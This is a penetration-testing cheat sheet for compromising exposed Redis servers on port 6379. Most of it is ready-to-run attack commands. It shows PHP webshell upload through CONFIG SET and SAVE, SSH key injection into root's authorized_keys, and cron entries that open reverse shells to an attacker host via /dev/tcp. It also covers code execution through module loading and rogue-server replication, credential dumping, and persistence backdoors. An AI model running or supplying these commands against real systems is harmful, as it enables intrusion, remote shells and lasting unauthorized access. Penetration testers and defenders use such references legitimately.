# Port 6379 - Redis

## Table of Contents
- [Enumeration](#enumeration)
  - [Connect](#connect)
  - [Nmap Scripts](#nmap-scripts)
  - [Basic Commands](#basic-commands)
- [Exploit](#exploit)
  - [Webshell Upload](#webshell-upload)
  - [SSH Key Injection](#ssh-key-injection)
  - [Cron Persistence](#cron-persistence)
  - [Module Loading RCE](#module-loading-rce)
  - [Master-Slave Replication RCE](#master-slave-replication-rce)
  - [Redis Rogue Server Attack](#redis-rogue-server-attack)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Check if Redis is open and get info
redis-cli -h $rhost INFO server 2>/dev/null | head -10 && echo '[+] Redis accessible!'

# Check authentication requirement
redis-cli -h $rhost CONFIG GET requirepass 2>/dev/null || echo '[!] Auth required or error'
```

### Nmap Scripts (One-liner)

```shell
# All Redis scripts
nmap -p 6379 --script "redis-*" $rhost
```

### Basic Enumeration (One-liner)

```shell
# Get all keys and config
printf "INFO\nKEYS *\nCONFIG GET dir\nCONFIG GET dbfilename\nCONFIG GET requirepass\n" | redis-cli -h $rhost

# Dump all keys and values
redis-cli -h $rhost KEYS "*" 2>/dev/null | xargs -I{} redis-cli -h $rhost GET {} 2>/dev/null
```

### Basic Commands

```shell
# Server info
INFO
INFO server
INFO keyspace

# Check authentication
AUTH password
CONFIG GET requirepass

# List all keys
KEYS *

# Get value
GET keyname

# Check configuration
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename

# Check connected clients
CLIENT LIST

# Dump database
SAVE
BGSAVE
```

### Metasploit Modules

```shell
# Redis version detection
use auxiliary/scanner/redis/redis_server

# File upload module
use auxiliary/scanner/redis/file_upload
set RHOSTS $rhost
set LocalFile /path/to/file
set RemoteFile /path/on/target
run
```

---

## Exploit

### Webshell Upload

> Requires write access to web directory

```shell
redis-cli -h $rhost

# Set working directory to web root
CONFIG SET dir /var/www/html/

# Set database filename
CONFIG SET dbfilename shell.php

# Create webshell payload
SET payload '<?php system($_GET["cmd"]); ?>'

# Save to file
SAVE
```

```shell
# Access webshell
curl http://$rhost/shell.php?cmd=whoami
```

### SSH Key Injection

> Requires write access to .ssh directory

```shell
# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Prepare payload with padding
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

# Inject key
redis-cli -h $rhost flushall
cat payload.txt | redis-cli -h $rhost -x set ssh_key
redis-cli -h $rhost CONFIG SET dir /root/.ssh/
redis-cli -h $rhost CONFIG SET dbfilename authorized_keys
redis-cli -h $rhost SAVE

# Connect via SSH
ssh -i redis_key root@$rhost
```

### One-liner SSH Key Injection

```shell
redis-cli -h $rhost -x set ssh_key < ~/.ssh/id_rsa.pub && \
redis-cli -h $rhost CONFIG SET dir /root/.ssh/ && \
redis-cli -h $rhost CONFIG SET dbfilename authorized_keys && \
redis-cli -h $rhost SAVE
```

### Cron Persistence

> Requires write access to cron directories

```shell
redis-cli -h $rhost

# Set cron directory
CONFIG SET dir /var/spool/cron/crontabs/
CONFIG SET dbfilename root

# Create reverse shell cron job
SET payload "\n\n* * * * * bash -i >& /dev/tcp/$lhost/$lport 0>&1\n\n"
SAVE
```

```shell
# Alternative: /etc/cron.d/
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename backdoor

SET payload "\n\n* * * * * root bash -i >& /dev/tcp/$lhost/$lport 0>&1\n\n"
SAVE
```

### Module Loading RCE

> Redis >= 4.0 supports loading external modules

```shell
# Clone and compile malicious module
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand
make

# Upload module.so to target (via webshell, ftp, etc.)

# Load module via Redis
redis-cli -h $rhost MODULE LOAD /path/to/module.so

# Execute commands
redis-cli -h $rhost system.exec "id"
redis-cli -h $rhost system.exec "whoami"
```

### Master-Slave Replication RCE

> Exploit master-slave replication to load malicious module

```shell
# Use redis-rogue-server
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server

# Start rogue server
python3 redis-rogue-server.py --rhost $rhost --lhost $lhost
```

### Redis Rogue Server Attack

> Advanced replication attack with custom module (Redis 4.x - 5.x)

#### Prepare Module

```shell
# Clone and fix module compilation issues
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand

# Fix header includes if needed
sed -i '10i #include <string.h>' src/module.c
sed -i '11i #include <arpa/inet.h>' src/module.c

# Compile
make

# Copy module to rogue server directory
cp module.so ~/redis-rogue-server/exp.so
```

#### Execute Attack

```shell
cd ~/redis-rogue-server

# Interactive mode (choose command)
python3 redis-rogue-server.py --rhost $rhost --rport 6379 --lhost $lhost --lport 21000

# Direct command execution
python3 redis-rogue-server.py --rhost $rhost --rport 6379 --lhost $lhost --lport 21000 --command "id"

# Reverse shell
python3 redis-rogue-server.py --rhost $rhost --rport 6379 --lhost $lhost --lport 21000 \
  --command "bash -i >& /dev/tcp/$lhost/4444 0>&1"
```

#### Manual Replication Attack

```shell
# If automated tool fails, do it manually:

# 1. Start your own Redis server with module
redis-server --port 21000 --loadmodule ./exp.so

# 2. Make target slave of your server
redis-cli -h $rhost SLAVEOF $lhost 21000

# 3. Wait for sync, then load module on target
redis-cli -h $rhost MODULE LOAD /tmp/exp.so

# 4. Execute commands
redis-cli -h $rhost system.exec "id"
```

---

## Post-Exploitation

### Credential Hunting

```shell
# Dump all keys
redis-cli -h $rhost KEYS *

# Get specific key values
redis-cli -h $rhost GET session:user
redis-cli -h $rhost GET secret_key

# Dump database content
redis-cli -h $rhost --scan --pattern '*'
```

### Configuration Check

```shell
# Get Redis configuration
CONFIG GET *

# Find sensitive settings
CONFIG GET requirepass
CONFIG GET masterauth
CONFIG GET bind
```

### Persistence

```shell
# Create scheduled task
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename redis_backdoor
SET backdoor "\n\n*/5 * * * * root /tmp/backdoor.sh\n\n"
SAVE

# Create backdoor script first
CONFIG SET dir /tmp/
CONFIG SET dbfilename backdoor.sh
SET script "\n#!/bin/bash\nbash -i >& /dev/tcp/$lhost/$lport 0>&1\n"
SAVE
```
